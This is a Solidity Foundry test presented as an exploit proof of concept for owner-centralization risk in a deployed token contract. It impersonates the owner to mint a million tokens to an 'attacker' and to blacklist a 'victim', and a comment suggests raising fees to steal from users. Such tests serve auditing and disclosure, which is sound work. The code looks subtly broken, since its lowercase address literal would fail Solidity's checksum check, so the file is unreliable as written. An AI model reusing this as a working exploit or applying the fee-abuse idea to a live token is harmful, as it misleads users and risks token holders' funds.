pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/////////////////////////////////////////////////////////////////////////////
// Interfaces for the vulnerable token
/////////////////////////////////////////////////////////////////////////////
interface ICoinToken {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function owner() external view returns (address);
    function mint(address account, uint256 amount) external;
    function burn(uint256 value) external;
    function pause() external;
    function unpause() external;
    function paused() external view returns (bool);
    function blackListAddress(address listAddress, bool isBlackListed) external returns (bool);
    function updateFee(uint256 _txFee, uint256 _burnFee, address _FeeAddress) external;
    function txFee() external view returns (uint256);
    function burnFee() external view returns (uint256);
    function FeeAddress() external view returns (address);
    function transferOwnership(address newOwner) external;
}

/////////////////////////////////////////////////////////////////////////////
// Exploit PoC – Centralization Risk
/////////////////////////////////////////////////////////////////////////////
contract ExploitTest is Test {
    address constant COIN = 0x86c86ffdc0482d8dd918fc657c3fc51c4a1e3e5c;
    ICoinToken public coin;

    address public owner;
    address public attacker = address(0xdead);
    address public victim = address(0xbeef);

    function setUp() public {
        coin = ICoinToken(COIN);
        vm.label(COIN, "CoinToken");
        vm.label(attacker, "Attacker");
        vm.label(victim, "Victim");

        // Get the current owner from the deployed contract
        owner = coin.owner();
        vm.label(owner, "Owner");

        // If the token is paused, unpause it (owner action)
        if (coin.paused()) {
            vm.startPrank(owner);
            coin.unpause();
            vm.stopPrank();
        }
    }

    function testCentralizationRisk() public {
        // Record balances and supply before exploit
        uint256 supplyBefore = coin.totalSupply();
        uint256 ownerBalanceBefore = coin.balanceOf(owner);
        uint256 attackerBalanceBefore = coin.balanceOf(attacker);

        // Owner mints a large amount of tokens to the attacker (centralized power)
        uint256 mintAmount = 1_000_000 * 10**18; // 1 million tokens
        vm.startPrank(owner);
        coin.mint(attacker, mintAmount);
        vm.stopPrank();

        uint256 supplyAfter = coin.totalSupply();
        uint256 attackerBalanceAfter = coin.balanceOf(attacker);

        // Assert supply and attacker balance increased by exactly the minted amount
        assertEq(supplyAfter, supplyBefore + mintAmount, "totalSupply should increase by mintAmount");
        assertEq(attackerBalanceAfter, attackerBalanceBefore + mintAmount, "attacker balance should increase by mintAmount");

        // Now demonstrate blacklist abuse: owner blacklists the victim
        vm.startPrank(owner);
        coin.blackListAddress(victim, true);
        vm.stopPrank();

        // Give victim some tokens via a transfer from owner (so victim can attempt to transfer)
        uint256 victimTokens = 100 * 10**18;
        vm.prank(owner);
        coin.transfer(victim, victimTokens);
        assertEq(coin.balanceOf(victim), victimTokens, "victim should have tokens");

        // Victim attempts to transfer – this should revert because victim is blacklisted
        vm.expectRevert(); // require(tokenBlacklist[msg.sender] == false) fails
        vm.prank(victim);
        coin.transfer(attacker, 1 ether);

        // Owner can also change fees to steal from normal users
        // (Example: set txFee to 50% and make FeeAddress the owner)
        // This is another demonstration of centralization risk, but the test already proves the point.
    }
}
